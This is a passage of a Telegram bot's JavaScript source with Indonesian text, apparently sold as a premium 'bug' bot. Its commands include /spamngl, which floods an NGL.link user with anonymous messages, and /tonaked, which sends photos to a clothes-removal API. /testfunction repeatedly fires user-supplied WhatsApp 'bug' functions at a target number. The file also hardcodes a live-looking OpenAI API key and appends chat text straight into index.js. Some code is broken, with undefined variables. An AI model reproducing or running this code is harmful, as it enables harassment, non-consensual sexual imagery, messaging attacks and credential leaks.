    newCase = await res.text();
  }

  if (!newCase) {
    return bot.sendMessage(chatId, "❌ ⵢ Gagal mendapatkan case dari reply.");
  }

  try {
    const appendText = `\n\n${newCase}\n`;
    fs.appendFileSync(MAIN_FILE, appendText, "utf8");

    await bot.sendMessage(chatId, "✅ ⵢ Case berhasil ditambahkan ke index.js!\nPlease Type /restart.", {
      reply_to_message_id: messageId
    });

  } catch (err) {
    bot.sendMessage(chatId, "⚠️ ⵢ Terjadi kesalahan: " + err.message);
  }
});

bot.onText(/^\/spamngl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const args = match[1] ? match[1].split(" ") : [];

  try {
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }
  
    if (args.length < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Format: /spamngl RannNewEra  10");
    }

    const username = args[0];
    const amount = parseInt(args[1], 10);
    const delay = 200;

    if (isNaN(amount) || amount < 1) {
      return bot.sendMessage(chatId, "❌ ⵢ Masukkan jumlah dan harus berupa angka!");
    }

    await bot.sendMessage(chatId, `⏳ Mengirim ${amount} pesan spam ke ${username}`);

    for (let i = 1; i <= amount; i++) {
      try {
        const deviceId = crypto.randomBytes(21).toString("hex");
        const message = "Who's mbape??";
        const body = `username=${username}&question=${encodeURIComponent(message)}&deviceId=${deviceId}`;

        await fetch("https://ngl.link/api/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
          },
          body,
        });
      } catch (err) {
        console.error(`Error kirim ke-${i}:`, err.message);
      }

      if (i < amount) {
        if (i % 50 === 0) {
          await new Promise((r) => setTimeout(r, delay + 200));
        } else {
          await new Promise((r) => setTimeout(r, delay));
        }
      }
    }

    bot.sendMessage(chatId, `✅ ⵢ Selesai mengirim ${amount} pesan spam ke ${username}`);
  } catch (error) {
    console.error("Error utama:", error);
    bot.sendMessage(chatId, "❌ ⵢ Gagal menghubungi API, coba lagi nanti.");
  }
});

// To Naked
bot.onText(/^\/tonaked(?:\s+(.+))?/,  async (msg, match) => {
    const chatId = msg.chat.id;
    const args = match[1];
    let imageUrl = args || null;

    if (!imageUrl && msg.reply_to_message && msg.reply_to_message.photo) {
      const fileId = msg.reply_to_message.photo.pop().file_id;
      const fileLink = await bot.getFileLink(fileId);
      imageUrl = fileLink;
    }

    if (!imageUrl) {
      return bot.sendMessage(chatId, "❌  Missing Input\nExample: /tonaked (reply gambar)");
    }

    const statusMsg = await bot.sendMessage(chatId, "⏳ Memproses gambar");

    try {
      const res = await fetch(
        `https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`
      );
      const data = await res.json();
      const hasil = data.result;

      if (!hasil) {
        return bot.editMessageText(
          "❌ ⵢ Gagal memproses gambar, pastikan URL atau foto valid",
          { chat_id: chatId, message_id: statusMsg.message_id }
        );
      }

      await bot.deleteMessage(chatId, statusMsg.message_id);
      await bot.sendPhoto(chatId, hasil);
    } catch (e) {
      await bot.editMessageText("❌ ⵢ Terjadi kesalahan saat memproses gambar", {
        chat_id: chatId,
        message_id: statusMsg.message_id,
      });
    }
  });

// Test Function
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}
bot.onText(/^\/testfunction(?:\s+(.+))?/, async (msg, match) => {
  if (!premiumUsers.some(user => user.id === msg.chat.id && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(msg.chat.id, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }
  
    try {
      const chatId = msg.chat.id;
      const args = msg.text.split(" ");
      if (args.length < 3)
        return bot.sendMessage(chatId, "❌ ⵢ Format :  /testfunction 62××× 10 (reply function)");

      const q = args[1];
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
      if (isNaN(jumlah) || jumlah <= 0)
        return bot.sendMessage(chatId, "❌ ⵢ Jumlah harus angka");

      if (!msg.reply_to_message || !msg.reply_to_message.text)
        return bot.sendMessage(chatId, "❌ ⵢ Reply dengan function");
        
      const processMsg = await bot.sendPhoto(chatId, imageThumbnail, {
        caption: `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Proccesing`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
          ],
        },
      });

      const safeSock = createSafeSock(sock)
      const funcCode = msg.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return bot.sendMessage("❌ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<blockquote><b>¡ ᬊ X-Vaelix Infinity ¡</b></blockquote>
⚚. ターゲット : ${q}
⚚. タイプ バグ : Uknown Function 
⚚. バグステータス : Succes`;

      try {
        await bot.editMessageCaption(finalText, {
          chat_id: chatId,
          message_id: processMsg.message_id,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      } catch (e) {
        await bot.sendPhoto(chatId, imageThumbnail, {
          caption: finalText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Cek [ ⚚ ] Target", url: `https://wa.me/${q}` }],
            ],
          },
        });
      }
    } catch (err) {
      console.log(err);
    }
  });

const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ ⵢ Format : Reply Code With Command /fixcode"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ ⵢ Balas ke pesan teks atau file kode.");
    }

    await bot.sendMessage(chatId, "🛠️ ⵢ Process Check & Fix Code");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>¡ ᬊ X-Vaelix Infinity ¡ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

<b>© ⚊ RannNewEra  - ¿?</b>
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ ⵢ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ ⵢ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ ⵢ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});

bot.onText(/^\/brat(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = match[1];

  let joined = await checkJoined(userId);

  if (!joined) {
    return sendJoinMessage(chatId);
  }

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;
    const res = await axios.get(apiURL, { responseType: "arraybuffer" });

    await bot.sendSticker(chatId, res.data, { filename: "sticker.webp" });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    bot.sendMessage(chatId, "❌ ⵢ Gagal membuat stiker brat.");
  }
});
const iqcSessions = {};
bot.onText(/^\/ssiphone(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ ⵢ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://joocode.zone.id/api/iqc?t=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
      caption: "✅ ⵢ SsIphone By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )",
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("ERROR callback_query:", err.message);
    bot.sendMessage(chatId, "Gagal generate IQC.");
  }
});

bot.onText(/^\/restart/, async (msg) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://RannNewEra " }]
        ]
      }
    });
  }
  await bot.sendMessage(chatId, "Succes Restart Bot");
  setTimeout(() => process.exit(0), 1000);
});
//CASE AUTO JOIN CH MEMEK
// ===============================
// AUTO JOIN CHANNEL - NTBA
// OWNER DARI config.json
// ===============================
const OWNER_ID = config.OWNER_ID

const forcedChannels = {
enabled: false,
channels: []
}

// ===============================
// COMMAND SET CHANNEL
// ===============================

bot.onText(/^\/channel(?: (.+))?$/i, async (msg, match) => {
try {

const chatId = msg.chat.id
const userId = msg.from.id

if (!isOwner(userId)) {
return bot.sendMessage(chatId, `
<blockquote>❌ Command ini khusus owner</blockquote>
`, {
parse_mode: "HTML"
})
}

const input = match[1]

if (!input) {
return bot.sendMessage(chatId, `
<blockquote>
📢 AUTO JOIN CHANNEL

Status : ${forcedChannels.enabled ? "ON" : "OFF"}

Channel :
${forcedChannels.channels.length
? forcedChannels.channels.map((v, i) => `${i + 1}. ${v}`).join("\n")
: "Belum ada channel"}

━━━━━━━━━━━━━━━━━━

Cara Pakai :

/channel on
/channel off

/channel @channel1
/channel @channel1, @channel2
/channel @channel1, @channel2, @channel3
</blockquote>
`, {
parse_mode: "HTML"
})
}

// ===============================
// ON / OFF
// ===============================

if (input.toLowerCase() === "on") {

forcedChannels.enabled = true

return bot.sendMessage(chatId, `
<blockquote>
✅ Auto join berhasil di aktifkan
</blockquote>
`, {
parse_mode: "HTML"
})
}

if (input.toLowerCase() === "off") {

forcedChannels.enabled = false

return bot.sendMessage(chatId, `
<blockquote>
❌ Auto join berhasil di nonaktifkan
</blockquote>
`, {
parse_mode: "HTML"
})
}

// ===============================
// SET CHANNEL
// ===============================

let channels = input
.split(",")
.map(v => v.trim())
.filter(v => v.startsWith("@"))

if (channels.length > 3) {
return bot.sendMessage(chatId, `
<blockquote>
❌ Maksimal hanya 3 channel
</blockquote>
`, {
parse_mode: "HTML"
})
}

forcedChannels.channels = channels

bot.sendMessage(chatId, `
<blockquote>
✅ Channel berhasil di set

${channels.map((v, i) => `${i + 1}. ${v}`).join("\n")}
</blockquote>
`, {
parse_mode: "HTML"
})

} catch (e) {
console.log(e)
}
})

// ===============================
// FUNCTION CHECK JOIN
// ===============================

async function checkJoined(userId) {
try {

if (!forcedChannels.enabled) return true
if (forcedChannels.channels.length < 1) return true

for (let ch of forcedChannels.channels) {

let member = await bot.getChatMember(ch, userId)

let status = member.status

if (
status !== "member" &&
status !== "administrator" &&
status !== "creator"
) {
return false
}

}

return true

} catch (e) {
console.log(e)
return false
}
}

// ===============================
// SEND JOIN MESSAGE
// ===============================

async function sendJoinMessage(chatId) {

let buttons = forcedChannels.channels.map(ch => {
return [{
text: `JOIN ${ch.replace("@", "").toUpperCase()}`,
url: `https://azharnakmakan${ch.replace("@", "")}`
}]
})

buttons.push([
{
text: "✅ VERIFIKASI",
callback_data: "verify_join"
}
])

return bot.sendMessage(chatId, `
<blockquote>
❌ AKSES DITOLAK

Kamu wajib join seluruh channel terlebih dahulu untuk menggunakan bot ini.

Silahkan join semua channel lalu tekan tombol verifikasi.
</blockquote>
`, {
parse_mode: "HTML",
reply_markup: {
inline_keyboard: buttons
}
})
}

// ===============================
// CALLBACK VERIFIKASI
// ===============================

bot.on("callback_query", async (q) => {
try {

if (q.data !== "verify_join") return

const userId = q.from.id
const chatId = q.message.chat.id

let joined = await checkJoined(userId)

if (!joined) {
return bot.answerCallbackQuery(q.id, {
text: "❌ Kamu belum join semua channel",
show_alert: true
})
}

bot.answerCallbackQuery(q.id, {
text: "✅ Verifikasi berhasil"
})

bot.editMessageText(`
<blockquote>
✅ Verifikasi berhasil

Sekarang kamu sudah bisa menggunakan bot.
</blockquote>
`, {
chat_id: chatId,
message_id: q.message.message_id,
parse_mode: "HTML"
})

} catch (e) {
console.log(e)
}
})


bot.onText(/^\/tiktokdl(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1]?.trim();

  if (!args)
    return bot.sendMessage(
      chatId,
      "❌ ⵢ Format: /tiktokdl https://example.com/"
    );

  let url = args;

  if (msg.entities) {
    for (const e of msg.entities) {
      if (e.type === "url") {
        url = msg.text.substring(e.offset, e.offset + e.length);
        break;
      }
    }
  }

  const wait = await bot.sendMessage(chatId, "Process Download Media Tiktok");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return bot.sendMessage(chatId, "❌ ⵢ Gagal ambil data video, pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = [];

      for (const img of imgs) {
        const res = await axios.get(img, { responseType: "arraybuffer" });
        media.push({
          type: "photo",
          media: { source: Buffer.from(res.data) }
        });
      }

      await bot.sendMediaGroup(chatId, media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await bot.sendVideo(
      chatId,
      Buffer.from(video.data),
      { supports_streaming: true },
      { filename: `${d.id || Date.now()}.mp4` }
    );
  } catch (e) {
    const errMsg = e?.response?.status
      ? `❌ ⵢ Error ${e.response.status} saat mengunduh video`
      : "❌ ⵢ Gagal mengunduh, koneksi lambat atau link salah";
    await bot.sendMessage(chatId, errMsg);
  } finally {
    try {
      await bot.deleteMessage(chatId, wait.message_id);
    } catch {}
  }
});

const sesi = {}

async function getTrack(query) {
  const url = `https://api.nekolabs.web.id/downloader/spotify/play/v1?q=${encodeURIComponent(query)}`
  const res = await axios.get(url)
  return res.data.result
}

bot.onText(/^\/play(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id
  const query = match[1]

  if (!query) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /play judul lagu")
  }

  sesi[chatId] = {
    musicList: [],
    index: 0
  }

  try {
    const result = await getTrack(query)
    sesi[chatId].musicList.push(result)
    sendMusicCard(chatId)
  } catch {
    bot.sendMessage(chatId, "❌ ⵢ Lagu tidak ditemukan.")
  }
})

bot.on("callback_query", async (cb) => {
  const chatId = cb.message.chat.id
  const action = cb.data

  const session = sesi[chatId]
  if (!session || session.musicList.length === 0) {
  return bot.answerCallbackQuery(cb.id, { text: "‎ " })
  }

  const d = session.musicList[session.index]

  if (action === "music_play") {
    await bot.answerCallbackQuery(cb.id)
    return bot.sendAudio(chatId, d.downloadUrl, {
      title: d.metadata.title,
      performer: d.metadata.artist
    })
  }

  if (action === "music_lyrics") {
    await bot.answerCallbackQuery(cb.id)
    try {
      const lyr = await axios.get(
        `https://api.deline.web.id/tools/lyrics?title=${encodeURIComponent(d.metadata.title)}`
      )
      return bot.sendMessage(
        chatId,
        lyr.data.result?.[0]?.plainLyrics || "❌ ⵢ Lirik tidak ditemukan."
      )
    } catch {
      return bot.sendMessage(chatId, "❌ ⵢ Error mengambil lirik.")
    }
  }
})

function sendMusicCard(chatId) {
  const session = sesi[chatId]
  const d = session.musicList[session.index]
  const meta = d.metadata

  const caption = `🎵 Song Name *${meta.title}*
👤 Artist : ${meta.artist}
⏱ Duration : ${meta.duration}
`

  bot.sendPhoto(chatId, meta.cover, {
    caption,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎧 Play", callback_data: "music_play" }],
        [{ text: "🔤 Lyrics", callback_data: "music_lyrics" }]
      ]
    }
  })
}

bot.onText(/^\/instagramdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const q = match[1]

  if (!q) return bot.sendMessage(chatId, "❌ ⵢ Format: /instagramdl <url>")

  bot.sendMessage(chatId, "🕑 ⵢ Process Download media...")

  const api = `https://api.nekolabs.web.id/downloader/instagram?url=${encodeURIComponent(q)}`

  try {
    const r = await axios.get(api, { timeout: 15000 })
    if (!r.data || !r.data.success) return bot.sendMessage(chatId, "❌ ⵢ Gagal mengambil data")

    const list = r.data.result.downloadUrl

    if (!Array.isArray(list) || list.length === 0) return bot.sendMessage(chatId, "❌ ⵢ Media tidak ditemukan")

    for (const media of list) {
      if (media.endsWith(".mp4")) {
        await bot.sendVideo(chatId, media)
      } else {
        await bot.sendPhoto(chatId, media)
      }
    }

  } catch (e) {
    console.log("Err IG:", e.message)
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan, coba lagi")
  }
})

bot.onText(/^\/facebookdl(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id
  const text = match[1]

  if (!text) return bot.sendMessage(chatId, "❌ ⵢ Format: /facebookdl <url>")

  const wait = await bot.sendMessage(chatId, "🕑 ⵢ Process Download Media...")

  try {
    const api = `https://api.nekolabs.web.id/downloader/facebook?url=${encodeURIComponent(text)}`
    const res = await axios.get(api)
    const result = res.data.result

    if (!result || !result.medias || result.medias.length === 0) {
      await bot.deleteMessage(chatId, wait.message_id)
      return bot.sendMessage(chatId, "❌ ⵢ Tidak ada media ditemukan.")
    }

    for (const m of result.medias) {
      if (m.type === "image") {
        await bot.sendPhoto(chatId, m.url)
      } else if (m.type === "video") {
        await bot.sendVideo(chatId, m.url)
      }
    }

    await bot.deleteMessage(chatId, wait.message_id)
  } catch (e) {
    try { await bot.deleteMessage(chatId, wait.message_id) } catch {}
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan.")
  }
})

bot.onText(/^\/gconly(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/RannNewEra " }]
        ]
      }
    });
  }
  const args = (match[1] || "").trim();
  if (!args || !/(on|off)/i.test(args)) {
    return bot.sendMessage(chatId, "❌ ⵢ Format: /gconly on | off");
  }
  const mode = args.toLowerCase();
  const status = mode === "on";
  setGroupOnly(status);
  bot.sendMessage(chatId, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, { parse_mode: "Markdown" });
});

bot.onText(/^\/cekid$/i, async (msg) => {
  const chatId = msg.chat.id;
  const user = msg.from;
  const firstName = user.first_name || "";
  const lastName = user.last_name || "";
  const userId = user.id;
  try {
    const photos = await bot.getUserProfilePhotos(userId, { limit: 1 });
    const fileId = photos.photos[0][0].file_id;
    const text = `<b>User Info :</b>\n<b>USERNAME :</b> ${user.username ? '@' + user.username : 'Tidak ada'}\n<b>ID TELEGRAM:</b> <code>${userId}</code>`;
    bot.sendPhoto(chatId, fileId, {
      caption: text,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: `${firstName} ${lastName}`, url: `tg://user?id=${userId}` }]
        ]
      }
    });
  } catch (e) {
    bot.sendMessage(chatId, `<b>ID :</b> <code>${userId}</code>`, { parse_mode: "HTML", reply_to_message_id: msg.message_id });
  }
});

bot.onText(/^\/pinterest(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match && match[1]) ? match[1].trim() : "";
  if (!query) return bot.sendMessage(chatId, "❌ ⵢ Format : /pinterest Butterfly");
  try {
    const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;
    const res = await axios.get(apiUrl, { timeout: 15000 });
    const data = res.data;
    if (!data || !data.result || data.result.length === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ No Pinterest images found for your query.");
    }
    await bot.sendPhoto(chatId, data.result[0], { caption: `📌 Pinterest Result for: *${query}*`, parse_mode: "Markdown" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Error fetching Pinterest image. Please try again later.");
  }
});


bot.onText(/^\/tofigure$/i, async (msg) => {
  const chatId = msg.chat.id;
  const reply = msg.reply_to_message;
  if (!reply || !reply.photo) return bot.sendMessage(chatId, "❌ ⵢ Format : Reply Image With Caption /tofigure.");
  await bot.sendMessage(chatId, "🕑 ⵢ Process Tofigure");
  try {
    const photo = reply.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await bot.getFile(fileId);
    const telegramUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
    const apiUrl = `https://api.elrayyxml.web.id/api/ephoto/figure?url=${encodeURIComponent(telegramUrl)}`;
    const result = await axios.get(apiUrl, { responseType: "arraybuffer", timeout: 30000 });
    await bot.sendPhoto(chatId, Buffer.from(result.data), { caption: "✅ ⵢ Tofigure By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🍁 )" });
  } catch (e) {
    bot.sendMessage(chatId, "❌ ⵢ Terjadi kesalahan." + (e.message || ""));
  }
});

bot.onText(/\/tourl/i, async (msg) => {
  const chatId = msg.chat.id;
  const repliedMsg = msg.reply_to_message;

  if (!repliedMsg || (!repliedMsg.document && !repliedMsg.photo && !repliedMsg.video)) {
    return bot.sendMessage(chatId, "❌ ⵢ Silakan reply sebuah file/foto/video dengan command /tourl");
  }

  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    const photos = repliedMsg.photo;
    fileId = photos[photos.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, "⏳ Mengupload ke Catbox..."); 

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const buffer = Buffer.from(response.data);

    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", buffer, {
      filename: fileName,
      contentType: response.headers["content-type"] || "application/octet-stream",
    });

    const { data: catboxUrl } = await axios.post("https://catbox.moe/user/api.php", form, {
      headers: form.getHeaders(),
    });

    if (!catboxUrl.startsWith("https://")) {
      throw new Error("Catbox tidak mengembalikan URL yang valid");
    }

    await bot.editMessageText(`✅ ⵢ Tourl By 𝐕𝐚𝐧𝐭𝐡𝐚𝐫𝐚 ( 🕷️ )\n📎 URL: ${catboxUrl}`, {
      chat_id: chatId,
      message_id: processingMsg.message_id,
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ ⵢ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const userId = msg.from.id;
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To 𝕬𝖚𝖙𝖍𝖔𝖗</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𖣂 ¡ #- 𝕬𝖚𝖙𝖍𝖔𝖗", url: "https://t.me/RannNewEra " }]
        ]
      }
    });
